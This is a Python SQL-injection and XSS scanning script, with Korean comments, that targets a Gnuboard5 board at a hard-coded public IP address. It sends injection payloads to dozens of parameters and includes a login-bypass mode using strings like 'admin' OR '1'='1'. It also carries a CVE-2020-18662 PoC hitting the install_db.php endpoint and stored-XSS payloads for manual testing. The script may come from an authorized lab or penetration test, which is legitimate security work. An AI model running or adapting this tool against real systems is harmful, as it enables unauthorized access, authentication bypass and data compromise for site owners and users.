"""
SQLi / XSS Scanner v3 - payloads_v2.json 기반
: TRUE/FALSE control baseline + XSS 반영 탐지 통합

Usage:
    python scanner.py
    python scanner.py --payloads payloads_v2.json --out scan_results_v3.json
    python scanner.py --point sqli_search_sfl --verbose
"""

import json
import time
import argparse
import sys
from typing import Dict, List, Optional, Tuple
from datetime import datetime

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ── 설정 ──────────────────────────────────────────────────────────

TARGET_BASE = "http://34.68.27.120:8081"

SLEEP_THRESHOLD   = 4.5   # TIME_BASED 탐지 기준 (초)
CTRL_DIFF_MINIMUM = 0.08  # Boolean 탐지 가능 판정 최소 차이 (8%)
BOOL_SIGNAL_MIN   = 0.05  # 페이로드 분류 최소 신호 강도

# MySQL 에러 패턴
MYSQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "xpath syntax error",
    "extractvalue(",
    "updatexml(",
    "duplicate entry",
    "column count doesn't match",
    "the used select statements have a different number",
    "supplied argument is not a valid mysql",
    "division by zero",
    "unknown column",
    "table 'g5_",          # Gnuboard5 테이블 노출
]

# XSS 탐지: 응답에 이 문자열이 HTML 인코딩 없이 나타나면 XSS
XSS_MARKERS = [
    "onerror=alert",
    "onload=alert",
    "onerror=eval",
    "ontoggle=alert",
    "onmouseover=alert",
    "onmouseover=\"alert",
    "onfocus=alert",
    "onstart=alert",
    "onanimationstart=alert",
    "src=x onerror",
    "<script>alert",
    "javascript:alert",
    "onerror=alert`",
    "href=javascript:",
    "<svg/onload",
    "<svg onload",
    "<details open ontoggle",
]

# ── 포인트별 설정 ─────────────────────────────────────────────────

POINT_CONFIG = {

    # ══ Reflected XSS ════════════════════════════════════════════

    "xss_search_stx": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {"sfl": "wr_subject", "sop": "and"},
        # XSS 모드에서는 ctrl 불필요하지만 형식 맞춤
        "ctrl_true":  "xss_check_marker_12345",
        "ctrl_false": "normal_search_test",
        "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
    },
    "xss_qalist_stx": {
        "url":    f"{TARGET_BASE}/bbs/qalist.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {"sfl": "wr_subject"},
        "ctrl_true":  "xss_check_marker_12345",
        "ctrl_false": "normal_search_test",
        "ctrl_extra": {"sfl": "wr_subject"},
    },

    # ══ SQLi: 필드 선택자 (sfl) ═══════════════════════════════════

    "sqli_search_sfl": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "sfl",
        "mode":   "sqli",
        "inject_extra": {"stx": "test", "sop": "and"},
        # sfl=wr_subject (정상) vs wr_content (다른 필드)
        # 차이가 없으면 boolean 불가 → error/time 탐지로 전환
        "ctrl_true":  "wr_subject",
        "ctrl_false": "wr_content",
        "ctrl_extra": {"stx": "test", "sop": "and"},
    },
    "sqli_qalist_sfl": {
        "url":    f"{TARGET_BASE}/bbs/qalist.php",
        "method": "GET",
        "param":  "sfl",
        "mode":   "sqli",
        "inject_extra": {"stx": "test"},
        "ctrl_true":  "wr_subject",
        "ctrl_false": "wr_content",
        "ctrl_extra": {"stx": "test"},
    },

    # ══ SQLi: ORDER BY 컬럼 (sst) ═════════════════════════════════

    "sqli_search_sst": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "sst",
        "mode":   "sqli",
        "inject_extra": {"stx": "", "sfl": "wr_subject", "sop": "and"},
        "ctrl_true":  "wr_datetime",   # 정렬 기준 A
        "ctrl_false": "wr_hit",        # 정렬 기준 B (내용 동일, 순서 다를 수 있음)
        "ctrl_extra": {"stx": "", "sfl": "wr_subject", "sop": "and"},
    },

    # ══ SQLi: 검색 키워드 문자열 컨텍스트 (stx) ═══════════════════

    "sqli_search_stx": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {"sfl": "wr_subject", "sop": "and"},
        # SQLi 작동 시 OR 1=1 → 모든 게시글 반환 vs OR 1=2 → 없음
        "ctrl_true":  "aaaa OR 1=1-- -",
        "ctrl_false": "aaaa OR 1=2-- -",
        "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
    },

    # ══ SQLi: 로그인 폼 (mb_id) ═══════════════════════════════════

    "sqli_login_mb_id": {
        "url":    f"{TARGET_BASE}/bbs/login_check.php",
        "method": "POST",
        "param":  "mb_id",
        "mode":   "sqli_login",
        "inject_extra": {"mb_password": "wrongpassword_xyz", "url": "/"},
        # SQLi 성공 시 로그인 됨 (응답 크기 차이 발생)
        "ctrl_true":  "admin' OR '1'='1'-- -",   # bypass 시도
        "ctrl_false": "definitely_no_such_user_xyz789",  # 실패 확실
        "ctrl_extra": {"mb_password": "wrongpassword_xyz", "url": "/"},
    },

    # ══ CVE-2020-18662: install/install_db.php table_prefix SQLi ═
    # PoC: table_prefix = "12'; select sleep(5)#"
    "cve_18662_install_sqli": {
        "url":    f"{TARGET_BASE}/install/install_db.php",
        "method": "POST",
        "param":  "table_prefix",
        "mode":   "sqli",
        "inject_extra": {
            "db_host":        "localhost",
            "db_user":        "root",
            "db_password":    "",
            "db_name":        "gnuboard",
            "db_port":        "3306",
            "admin_id":       "admin",
            "admin_password": "admin",
            "admin_email":    "admin@test.com",
        },
        "ctrl_true":  "g5_",    # 정상 prefix
        "ctrl_false": "zz_",    # 다른 정상 prefix
        "ctrl_extra": {
            "db_host":        "localhost",
            "db_user":        "root",
            "db_password":    "",
            "db_name":        "gnuboard",
            "db_port":        "3306",
            "admin_id":       "admin",
            "admin_password": "admin",
            "admin_email":    "admin@test.com",
        },
    },

    # ══ CVE-2020-18661: bbs/login.php url 파라미터 Reflected XSS ══
    "cve_18661_login_xss": {
        "url":    f"{TARGET_BASE}/bbs/login.php",
        "method": "GET",
        "param":  "url",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ CVE-2020-18663: bbs/move_update.php XSS (bo_table) ═══════
    "cve_18663_move_xss": {
        "url":    f"{TARGET_BASE}/bbs/move_update.php",
        "method": "POST",
        "param":  "bo_table",
        "mode":   "xss",
        "inject_extra": {"wr_id": "1", "sw": "move"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ search.php stx — 단순 quote 방식 재테스트 ════════════════
    "sqli_search_stx_fix": {
        "url":    f"{TARGET_BASE}/bbs/search.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {"sfl": "wr_subject", "sop": "and"},
        "ctrl_true":  "' OR '1'='1",
        "ctrl_false": "'zzz_no_match'",
        "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
    },

    # ══ faq.php stx — SQLi ════════════════════════════════════════
    "sqli_faq_stx": {
        "url":    f"{TARGET_BASE}/bbs/faq.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {},
        "ctrl_true":  "' OR '1'='1",
        "ctrl_false": "'zzz_no_match'",
        "ctrl_extra": {},
    },

    # ══ faq.php stx — XSS ════════════════════════════════════════
    "xss_faq_stx": {
        "url":    f"{TARGET_BASE}/bbs/faq.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ write_update.php — Stored XSS 우회 (로그인 필요 → 수동) ══
    # 아래 2개는 PAYLOAD_TO_POINT에서 None 처리 (수동 테스트 안내용)

    # ══ 게시판 (board.php) — XSS ══════════════════════════════════
    "xss_board_stx": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "xss",
        "inject_extra": {"bo_table": "free", "sfl": "wr_subject"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 게시판 (board.php) — SQLi stx ════════════════════════════
    "sqli_board_stx": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "stx",
        "mode":   "sqli",
        "inject_extra": {"bo_table": "free", "sfl": "wr_subject"},
        "ctrl_true":  "aaaa OR 1=1-- -",
        "ctrl_false": "aaaa OR 1=2-- -",
        "ctrl_extra": {"bo_table": "free", "sfl": "wr_subject"},
    },

    # ══ 게시판 (board.php) — SQLi sfl ════════════════════════════
    "sqli_board_sfl": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "sfl",
        "mode":   "sqli",
        "inject_extra": {"bo_table": "free", "stx": "test"},
        "ctrl_true":  "wr_subject",
        "ctrl_false": "wr_content",
        "ctrl_extra": {"bo_table": "free", "stx": "test"},
    },

    # ══ 게시판 (board.php) — SQLi sst ════════════════════════════
    "sqli_board_sst": {
        "url":    f"{TARGET_BASE}/bbs/board.php",
        "method": "GET",
        "param":  "sst",
        "mode":   "sqli",
        "inject_extra": {"bo_table": "free", "stx": "", "sfl": "wr_subject"},
        "ctrl_true":  "wr_datetime",
        "ctrl_false": "wr_hit",
        "ctrl_extra": {"bo_table": "free", "stx": "", "sfl": "wr_subject"},
    },

    # ══ Ajax 회원 확인 — SQLi mb_id ══════════════════════════════
    "sqli_ajax_member": {
        "url":    f"{TARGET_BASE}/bbs/ajax.member_check.php",
        "method": "POST",
        "param":  "mb_id",
        "mode":   "sqli",
        "inject_extra": {},
        "ctrl_true":  "admin",
        "ctrl_false": "zzznonexistent_xyz",
        "ctrl_extra": {},
    },

    # ══ move_update.php — from_bo_table XSS (CVE-2020-18663 retry)
    "xss_move_from_bo": {
        "url":    f"{TARGET_BASE}/bbs/move_update.php",
        "method": "POST",
        "param":  "from_bo_table",
        "mode":   "xss",
        "inject_extra": {"wr_id": "1", "sw": "move", "bo_table": "free"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ move_update.php — wr_id XSS ══════════════════════════════
    "xss_move_wr_id": {
        "url":    f"{TARGET_BASE}/bbs/move_update.php",
        "method": "GET",
        "param":  "wr_id",
        "mode":   "xss",
        "inject_extra": {"bo_table": "free", "sw": "move"},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 비밀번호 페이지 — url XSS ════════════════════════════════
    "xss_password_url": {
        "url":    f"{TARGET_BASE}/bbs/password.php",
        "method": "GET",
        "param":  "url",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 프로필 페이지 — mb_id XSS ════════════════════════════════
    "xss_profile_mb": {
        "url":    f"{TARGET_BASE}/bbs/profile.php",
        "method": "GET",
        "param":  "mb_id",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 프로필 페이지 — mb_id SQLi ═══════════════════════════════
    "sqli_profile_mb": {
        "url":    f"{TARGET_BASE}/bbs/profile.php",
        "method": "GET",
        "param":  "mb_id",
        "mode":   "sqli",
        "inject_extra": {},
        "ctrl_true":  "admin",
        "ctrl_false": "zzznonexistent_xyz",
        "ctrl_extra": {},
    },

    # ══ 회원가입 폼 — mb_nick XSS ════════════════════════════════
    "xss_register_name": {
        "url":    f"{TARGET_BASE}/bbs/register_form.php",
        "method": "GET",
        "param":  "mb_nick",
        "mode":   "xss",
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },

    # ══ 로그인 url — Open Redirect ════════════════════════════════
    "open_redirect_login": {
        "url":    f"{TARGET_BASE}/bbs/login.php",
        "method": "GET",
        "param":  "url",
        "mode":   "xss",   # 반영 여부로 확인
        "inject_extra": {},
        "ctrl_true":  "",
        "ctrl_false": "",
        "ctrl_extra": {},
    },
}


# ── HTTP 세션 ──────────────────────────────────────────────────────

def make_session() -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Security-Research-Scanner/3.0)",
        "Accept-Language": "ko-KR,ko;q=0.9",
    })
    return session


# ── 요청 전송 ─────────────────────────────────────────────────────

def send(session: requests.Session, config: dict,
         inject_value: str, extra: dict,
         timeout: int) -> Optional[dict]:
    params = {**extra, config["param"]: inject_value}
    try:
        t0 = time.time()
        if config["method"] == "GET":
            r = session.get(config["url"], params=params, timeout=timeout)
        else:
            r = session.post(config["url"], data=params,
                             timeout=timeout, allow_redirects=True)
        elapsed = time.time() - t0
        return {
            "status":  r.status_code,
            "length":  len(r.content),
            "elapsed": elapsed,
            "text":    r.text,           # XSS 탐지용 원본 텍스트
            "textl":   r.text.lower(),   # SQLi 에러 탐지용 소문자
        }
    except requests.exceptions.Timeout:
        return {"status": 0, "length": 0, "elapsed": timeout,
                "text": "", "textl": "", "timeout": True}
    except Exception:
        return None


def has_mysql_error(textl: str) -> bool:
    return any(p in textl for p in MYSQL_ERRORS)


def has_xss_marker(text: str) -> Tuple[bool, str]:
    """응답 HTML에 XSS 마커가 HTML 인코딩 없이 존재하는지 확인."""
    tl = text.lower()
    for marker in XSS_MARKERS:
        if marker.lower() in tl:
            # HTML 인코딩된 버전이 아닌지 확인 (&lt; 가 아닌 실제 <)
            if "&lt;" not in text[:text.lower().find(marker.lower()) + len(marker)].lower()[-20:]:
                return True, marker
    return False, ""


# ── 제어 기준 측정 ─────────────────────────────────────────────────

def measure_controls(session, config: dict,
                     timeout: int) -> Tuple[Optional[dict], Optional[dict], bool]:
    if config["mode"] == "xss":
        # XSS 모드: control 측정 불필요
        return None, None, False

    print(f"  [CTRL] TRUE  : {config['ctrl_true'][:60]}")
    print(f"  [CTRL] FALSE : {config['ctrl_false'][:60]}")

    ct = send(session, config, config["ctrl_true"],
              config.get("ctrl_extra", {}), timeout)
    cf = send(session, config, config["ctrl_false"],
              config.get("ctrl_extra", {}), timeout)

    if not ct or not cf:
        print("  [CTRL] 제어 요청 실패")
        return None, None, False

    diff = abs(ct["length"] - cf["length"]) / max(cf["length"], 1)
    possible = diff >= CTRL_DIFF_MINIMUM

    print(f"  [CTRL] TRUE  응답: {ct['length']:6d} bytes  t={ct['elapsed']:.2f}s")
    print(f"  [CTRL] FALSE 응답: {cf['length']:6d} bytes  t={cf['elapsed']:.2f}s")

    if possible:
        print(f"  [CTRL] 차이 {diff:.1%} → Boolean 탐지 가능 ✓")
    else:
        print(f"  [CTRL] 차이 {diff:.1%} → Boolean 구분 불가 (Error/Time 탐지로 진행)")

    return ct, cf, possible


# ── 탐지 판정 ──────────────────────────────────────────────────────

def detect(record: dict, resp: dict,
           ctrl_true: Optional[dict], ctrl_false: Optional[dict],
           boolean_possible: bool,
           mode: str) -> Tuple[bool, str]:

    rtype = record["type"].upper()

    # ══ XSS 탐지 ════════════════════════════════════════════════
    if mode == "xss" or "XSS" in rtype:
        found, marker = has_xss_marker(resp["text"])
        if found:
            return True, f"xss_marker_unencoded: '{marker}' found in response"
        # HTML 인코딩 여부 추가 확인
        if "&lt;img" in resp["textl"] or "&lt;svg" in resp["textl"]:
            return False, "xss_encoded: payload HTML-encoded (filtered)"
        return False, "xss_not_reflected"

    # ══ 시간 지연 탐지 ══════════════════════════════════════════
    if "TIME" in rtype or "SLEEP" in record["family"].lower():
        if resp.get("timeout") or resp["elapsed"] >= SLEEP_THRESHOLD:
            return True, f"time_delay={resp['elapsed']:.2f}s (>= {SLEEP_THRESHOLD}s)"
        return False, f"no_delay (elapsed={resp['elapsed']:.2f}s)"

    # ══ 에러 문자열 탐지 ════════════════════════════════════════
    if has_mysql_error(resp["textl"]):
        matched = [p for p in MYSQL_ERRORS if p in resp["textl"]]
        return True, f"mysql_error: {matched[:2]}"

    # ══ 로그인 우회 탐지 ════════════════════════════════════════
    if mode == "sqli_login":
        # 로그인 성공 시: 응답 크기 차이 or 특정 문자열
        success_signs = ["로그아웃", "logout", "마이페이지", "mypage", "mb_name"]
        fail_signs    = ["로그인", "아이디", "비밀번호", "틀렸", "잘못"]
        tl = resp["textl"]
        if any(s in tl for s in success_signs):
            return True, "login_bypass: success page detected"
        if ctrl_true and ctrl_false:
            # ctrl_true(bypass 시도)보다 현재 응답이 성공 쪽에 가까우면
            pass
        return False, "login_failed_as_expected"

    # ══ Boolean 탐지 ════════════════════════════════════════════
    is_bool = any(t in rtype for t in
                  ("BOOLEAN", "TAUTOLOGY", "CONDITIONAL", "EXIST",
                   "FIELD", "ORDERBY", "STRING", "LOGIN"))
    if is_bool and boolean_possible and ctrl_true and ctrl_false:
        t_len = ctrl_true["length"]
        f_len = ctrl_false["length"]
        r_len = resp["length"]
        dist_true  = abs(r_len - t_len)
        dist_false = abs(r_len - f_len)
        ctrl_span  = abs(t_len - f_len)
        if dist_true < dist_false:
            signal = (dist_false - dist_true) / max(ctrl_span, 1)
            if signal >= BOOL_SIGNAL_MIN:
                return True, (
                    f"boolean_TRUE_condition: resp={r_len}, "
                    f"ctrl_true={t_len}, ctrl_false={f_len}, signal={signal:.1%}"
                )
        return False, f"boolean_FALSE_condition (resp={r_len})"

    return False, "no_signal"


# ── 포인트별 스캔 ─────────────────────────────────────────────────

def scan_point(session, point_name: str, payloads: dict,
               timeout: int, verbose: bool) -> List[dict]:

    config  = POINT_CONFIG[point_name]
    results = []
    mode    = config.get("mode", "sqli")

    print(f"\n{'='*60}")
    print(f"  Input Point : {point_name}")
    print(f"  URL         : {config['url']}")
    print(f"  Method      : {config['method']}  Param: {config['param']}")
    print(f"  Mode        : {mode.upper()}")
    print(f"{'='*60}")

    ctrl_true, ctrl_false, boolean_possible = measure_controls(
        session, config, timeout)

    total_vuln   = 0
    total_tested = 0

    for vtype, records in payloads.items():
        if not records:
            continue

        print(f"\n  -- [{vtype}]  ({len(records)} payloads) --")

        for rec in records:
            total_tested += 1
            payload = rec["payload"]

            resp = send(session, config, payload,
                        config.get("inject_extra", {}), timeout)

            if resp is None:
                vulnerable, reason = False, "request_failed"
            else:
                vulnerable, reason = detect(
                    rec, resp, ctrl_true, ctrl_false,
                    boolean_possible, mode)

            if vulnerable:
                total_vuln += 1

            if verbose or vulnerable:
                flag = "*** VULN ***" if vulnerable else "    safe   "
                print(f"\n    [{flag}]  {payload[:70]}")
                print(f"             reason : {reason}")
                if resp:
                    print(f"             resp   : "
                          f"status={resp['status']} "
                          f"len={resp['length']} "
                          f"t={resp['elapsed']:.2f}s")
            else:
                print(".", end="", flush=True)

            results.append({
                "point":      point_name,
                "vuln_type":  vtype,
                "type":       rec["type"],
                "family":     rec["family"],
                "payload":    payload,
                "vulnerable": vulnerable,
                "reason":     reason,
                "mode":       mode,
                "response": {
                    "status":  resp["status"]  if resp else None,
                    "length":  resp["length"]  if resp else None,
                    "elapsed": round(resp["elapsed"], 3) if resp else None,
                } if resp else None,
                "controls": {
                    "true_len":  ctrl_true["length"]  if ctrl_true  else None,
                    "false_len": ctrl_false["length"] if ctrl_false else None,
                    "boolean_possible": boolean_possible,
                },
            })

        if not verbose:
            print()

    print(f"\n  [SUMMARY] {point_name}: {total_vuln}/{total_tested} 탐지")
    return results


# ── Main ──────────────────────────────────────────────────────────

def main():
    global SLEEP_THRESHOLD
    parser = argparse.ArgumentParser(
        description="SQLi/XSS Scanner v3 — payloads_v2.json 기반")
    parser.add_argument("--payloads", default="payloads_v2.json")
    parser.add_argument("--out",      default="scan_results_v3.json")
    parser.add_argument("--timeout",  type=int,   default=12)
    parser.add_argument("--sleep-threshold", type=float,
                        dest="sleep_threshold", default=SLEEP_THRESHOLD)
    parser.add_argument("--verbose",  action="store_true")
    parser.add_argument("--point",    default=None,
                        help="특정 포인트만 (예: sqli_search_sfl)")
    args = parser.parse_args()

    SLEEP_THRESHOLD = args.sleep_threshold

    try:
        with open(args.payloads, encoding="utf-8") as f:
            all_payloads: Dict = json.load(f)
    except FileNotFoundError:
        print(f"[ERROR] {args.payloads} 없음. generate_payloads.py 먼저 실행.")
        sys.exit(1)

    print(f"\n{'='*60}")
    print(f"  SQLi/XSS Scanner v3")
    print(f"  Target  : {TARGET_BASE}")
    print(f"  Payloads: {args.payloads}")
    print(f"  Timeout : {args.timeout}s  Sleep-threshold: {SLEEP_THRESHOLD}s")
    print(f"  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}")

    # payloads_v2.json의 포인트명 → POINT_CONFIG 매핑
    # (페이로드 키와 scanner 키가 다를 수 있어서 매핑)
    PAYLOAD_TO_POINT = {
        "xss_wr_subject":        None,               # 수동 테스트 필요 (로그인 필요)
        "xss_wr_content":        None,               # 수동 테스트 필요 (로그인 필요)
        "xss_search_stx":        "xss_search_stx",
        "xss_qalist_stx":        "xss_qalist_stx",
        "xss_comment":           None,               # 수동 테스트 필요 (로그인 필요)
        "sqli_search_sfl":       "sqli_search_sfl",
        "sqli_search_sst":       "sqli_search_sst",
        "sqli_search_stx":       "sqli_search_stx",
        "sqli_login_mb_id":      "sqli_login_mb_id",
        "sqli_qalist_sfl":       "sqli_qalist_sfl",
        # CVE 전용 포인트
        "cve_18662_install_sqli": "cve_18662_install_sqli",
        "cve_18661_login_xss":    "cve_18661_login_xss",
        "cve_18663_move_xss":     "cve_18663_move_xss",
        # 전체 포인트 (payloads_full.json)
        "sqli_search_stx_fix":    "sqli_search_stx_fix",
        "sqli_faq_stx":           "sqli_faq_stx",
        "xss_faq_stx":            "xss_faq_stx",
        "xss_write_subject_bypass": None,   # 수동 (로그인 필요)
        "xss_write_content_bypass": None,   # 수동 (로그인 필요)
        "xss_board_stx":          "xss_board_stx",
        "sqli_board_stx":         "sqli_board_stx",
        "sqli_board_sfl":         "sqli_board_sfl",
        "sqli_board_sst":         "sqli_board_sst",
        "sqli_ajax_member":       "sqli_ajax_member",
        "xss_move_from_bo":       "xss_move_from_bo",
        "xss_move_wr_id":         "xss_move_wr_id",
        "xss_password_url":       "xss_password_url",
        "xss_profile_mb":         "xss_profile_mb",
        "sqli_profile_mb":        "sqli_profile_mb",
        "xss_register_name":      "xss_register_name",
        "open_redirect_login":    "open_redirect_login",
    }

    session  = make_session()
    all_res: List[dict] = []

    # 수동 테스트 항목 안내
    manual_points = [k for k, v in PAYLOAD_TO_POINT.items()
                     if v is None and k in all_payloads]
    if manual_points:
        print(f"\n  [INFO] 아래 포인트는 로그인 필요 → 수동 테스트:")
        for mp in manual_points:
            print(f"         - {mp}")

    # 자동 스캔 대상 결정
    if args.point:
        scan_keys = [args.point]
    else:
        scan_keys = [k for k, v in PAYLOAD_TO_POINT.items()
                     if v is not None and k in all_payloads]

    for payload_key in scan_keys:
        point_key = PAYLOAD_TO_POINT.get(payload_key, payload_key)
        if point_key is None:
            print(f"\n  [SKIP] {payload_key} → 수동 테스트 필요")
            continue
        if point_key not in POINT_CONFIG:
            print(f"\n  [SKIP] {point_key} → POINT_CONFIG 없음")
            continue

        results = scan_point(
            session, point_key, all_payloads[payload_key],
            timeout=args.timeout, verbose=args.verbose)
        # 결과에 payload_key 추가
        for r in results:
            r["payload_source"] = payload_key
        all_res.extend(results)

    # 저장
    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(all_res, f, ensure_ascii=False, indent=2)

    # 최종 요약
    total  = len(all_res)
    vulns  = [r for r in all_res if r["vulnerable"]]
    n_vuln = len(vulns)

    print(f"\n{'='*60}")
    print(f"  SCAN COMPLETE")
    print(f"  총 테스트  : {total}")
    print(f"  탐지 건수  : {n_vuln} ({n_vuln / max(total, 1) * 100:.1f}%)")
    print(f"  결과 저장  : {args.out}")
    print(f"{'='*60}")

    if vulns:
        print("\n  *** 확인된 취약점 ***\n")
        for r in vulns:
            print(f"  [{r['point']:20s}] [{r['type']:20s}] [{r['family']:25s}]")
            print(f"    payload : {r['payload'][:80]}")
            print(f"    reason  : {r['reason']}")
            if r["response"]:
                print(f"    resp    : status={r['response']['status']} "
                      f"len={r['response']['length']} "
                      f"t={r['response']['elapsed']}s")
            print()
    else:
        print("\n  취약점이 탐지되지 않았습니다.")
        print("\n  수동 테스트 항목 (브라우저에서 직접 확인):")
        print("  1. /bbs/write_update.php → wr_subject에 <img src=x onerror=alert(1)> 입력")
        print("  2. /bbs/write_update.php → wr_content에 <svg/onload=alert(1)> 입력")
        print("  3. /bbs/write_comment_update.php → 댓글에 http://x.com\" onmouseover=\"alert(1) 입력")

    print(f"\n  완료: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")


if __name__ == "__main__":
    main()
